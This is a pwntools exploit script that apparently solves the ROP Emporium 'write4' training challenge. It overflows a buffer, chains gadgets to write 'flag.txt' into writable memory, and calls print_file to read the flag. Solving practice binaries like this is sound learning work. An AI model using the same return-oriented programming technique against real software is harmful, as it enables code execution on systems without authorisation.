from pwn import *

bin = './write4'
elf = ELF(bin)
p = process(bin)

offset = 40

pop_r14_r15 = 0x400690
mov_r14_r15 = 0x400628
pop_rdi = 0x400693

data = 0x601028

payload  = b"A"*offset

# write "flag.txt" into writable memory
payload += p64(pop_r14_r15)
payload += p64(data)          # r14 = writable address
payload += b"flag.txt"        # r15 = string
payload += p64(mov_r14_r15)

# set up argument for print_file
payload += p64(pop_rdi)
payload += p64(data)          # rdi = address of "flag.txt"

# call print_file
payload += p64(elf.plt['print_file'])
payload += p64(elf.symbols['main'])    # clean return address(prevents annoying core dumps)

p.sendafter(b'> ', payload)

output = p.recvall(timeout=1).decode()
print(output)
